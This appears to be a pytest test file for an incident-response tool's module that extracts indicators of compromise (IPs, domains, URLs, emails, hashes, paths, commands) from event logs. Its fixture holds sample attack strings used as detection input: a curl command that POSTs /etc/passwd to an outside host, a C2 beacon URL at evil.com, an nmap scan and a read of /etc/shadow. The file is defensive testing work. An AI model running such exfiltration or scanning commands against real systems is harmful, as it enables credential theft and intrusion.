"""Tests for the IOC extraction module."""

import json
from pathlib import Path

import pytest

from orbit_ir.ioc import (
    IOCExtractor,
    extract_iocs,
    format_ioc_text,
    _flatten_values,
)


@pytest.fixture
def evidence_dir(tmp_path: Path) -> Path:
    events = [
        {
            "event_id": "e1",
            "timestamp": "2026-01-15T10:00:00Z",
            "agent_id": "agent-1",
            "action": "connect",
            "target": "192.168.1.100",
            "details": "Connecting to malicious C2 at https://evil.com/beacon",
        },
        {
            "event_id": "e2",
            "timestamp": "2026-01-15T10:01:00Z",
            "agent_id": "agent-2",
            "action": "exfiltrate",
            "target": "data.example.org",
            "details": "curl -X POST https://data.example.org/upload -d @/etc/passwd",
            "hash": "5d41402abc4b2a76b9719d911017c592",
        },
        {
            "event_id": "e3",
            "timestamp": "2026-01-15T10:02:00Z",
            "agent_id": "agent-1",
            "action": "email",
            "details": "Sent phishing email to admin@target.com from attacker@evil.com",
        },
        {
            "event_id": "e4",
            "timestamp": "2026-01-15T10:03:00Z",
            "agent_id": "agent-3",
            "action": "scan",
            "details": "nmap -sS 10.0.0.0/24",
            "path": "/tmp/scan_results.txt",
        },
    ]
    (tmp_path / "events.jsonl").write_text(
        "\n".join(json.dumps(e) for e in events), encoding="utf-8"
    )
    return tmp_path


def test_extract_ipv4():
    extractor = IOCExtractor()
    ev = {"details": "Connected to 192.168.1.100 and 10.0.0.1"}
    found = extractor.extract_from_event(ev, "e1")
    ipv4s = [f for f in found if f["type"] == "ipv4"]
    values = {f["value"] for f in ipv4s}
    assert "192.168.1.100" in values
    assert "10.0.0.1" in values


def test_extract_domain():
    extractor = IOCExtractor()
    ev = {"details": "Resolved evil.com and data.example.org"}
    found = extractor.extract_from_event(ev, "e1")
    domains = [f for f in found if f["type"] == "domain"]
    values = {f["value"] for f in domains}
    assert "evil.com" in values
    assert "data.example.org" in values


def test_extract_url():
    extractor = IOCExtractor()
    ev = {"details": "GET https://malware.io/payload.exe"}
    found = extractor.extract_from_event(ev, "e1")
    urls = [f for f in found if f["type"] == "url"]
    values = {f["value"] for f in urls}
    assert any("malware.io" in v for v in values)


def test_extract_email():
    extractor = IOCExtractor()
    ev = {"details": "Email from attacker@evil.com to victim@target.org"}
    found = extractor.extract_from_event(ev, "e1")
    emails = [f for f in found if f["type"] == "email"]
    values = {f["value"] for f in emails}
    assert "attacker@evil.com" in values
    assert "victim@target.org" in values


def test_extract_md5_hash():
    extractor = IOCExtractor()
    ev = {"hash": "5d41402abc4b2a76b9719d911017c592"}
    found = extractor.extract_from_event(ev, "e1")
    hashes = [f for f in found if f["type"] == "md5"]
    assert len(hashes) >= 1
    assert hashes[0]["value"] == "5d41402abc4b2a76b9719d911017c592"


def test_extract_sha256_hash():
    extractor = IOCExtractor()
    h = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
    ev = {"hash": h}
    found = extractor.extract_from_event(ev, "e1")
    sha256s = [f for f in found if f["type"] == "sha256"]
    assert any(f["value"] == h for f in sha256s)


def test_extract_file_path():
    extractor = IOCExtractor()
    ev = {"details": "Reading /etc/shadow for credentials"}
    found = extractor.extract_from_event(ev, "e1")
    paths = [f for f in found if f["type"] == "file_path"]
    values = {f["value"] for f in paths}
    assert any("/etc/shadow" in v for v in values)


def test_extract_command():
    extractor = IOCExtractor()
    ev = {"details": "nmap -sS 10.0.0.0/24"}
    found = extractor.extract_from_event(ev, "e1")
    cmds = [f for f in found if f["type"] == "command"]
    assert len(cmds) >= 1
    assert any("nmap" in f["value"] for f in cmds)


def test_deduplication():
    extractor = IOCExtractor()
    ev1 = {"details": "Connect to 192.168.1.1"}
    ev2 = {"details": "Again at 192.168.1.1"}
    extractor.extract_from_event(ev1, "e1")
    extractor.extract_from_event(ev2, "e2")
    data = extractor.to_dict()
    ipv4s = data.get("ipv4", [])
    matching = [e for e in ipv4s if e["value"] == "192.168.1.1"]
    assert len(matching) == 1
    assert matching[0]["count"] == 2


def test_to_dict_grouped_by_type(evidence_dir):
    extractor = extract_iocs(evidence_dir)
    data = extractor.to_dict()
    assert isinstance(data, dict)
    for ioc_type, entries in data.items():
        assert isinstance(entries, list)
        for entry in entries:
            assert entry["type"] == ioc_type
            assert "value" in entry
            assert "count" in entry
            assert "first_seen" in entry


def test_to_dict_sorted_by_count():
    extractor = IOCExtractor()
    for _ in range(5):
        extractor.extract_from_event({"details": "192.168.1.1"}, "e1")
    for _ in range(2):
        extractor.extract_from_event({"details": "10.0.0.1"}, "e2")
    data = extractor.to_dict()
    ipv4s = data.get("ipv4", [])
    assert len(ipv4s) == 2
    assert ipv4s[0]["count"] >= ipv4s[1]["count"]


def test_format_ioc_text(evidence_dir):
    extractor = extract_iocs(evidence_dir)
    data = extractor.to_dict()
    text = format_ioc_text(data)
    assert "Indicators of Compromise" in text
    assert "Summary" in text


def test_format_ioc_type_filter(evidence_dir):
    extractor = extract_iocs(evidence_dir)
    data = extractor.to_dict()
    text = format_ioc_text(data, type_filter="ipv4")
    assert "IPV4" in text
    if "domain" in data:
        assert "DOMAIN" not in text


def test_format_ioc_min_count(evidence_dir):
    extractor = extract_iocs(evidence_dir)
    data = extractor.to_dict()
    text = format_ioc_text(data, min_count=999)
    assert "Total unique IOCs: 0" in text


def test_flatten_values():
    obj = {"a": "hello", "b": {"c": "world"}, "d": [1, 2]}
    text = _flatten_values(obj)
    assert "hello" in text
    assert "world" in text


def test_extract_from_directory(evidence_dir):
    extractor = IOCExtractor()
    data = extractor.extract_from_directory(evidence_dir)
    assert isinstance(data, dict)
    total = sum(len(v) for v in data.values())
    assert total > 0


def test_false_positive_hash_excluded():
    extractor = IOCExtractor()
    ev = {"hash": "d41d8cd98f00b204e9800998ecf8427e"}
    found = extractor.extract_from_event(ev, "e1")
    md5s = [f for f in found if f["type"] == "md5"]
    assert len(md5s) == 0
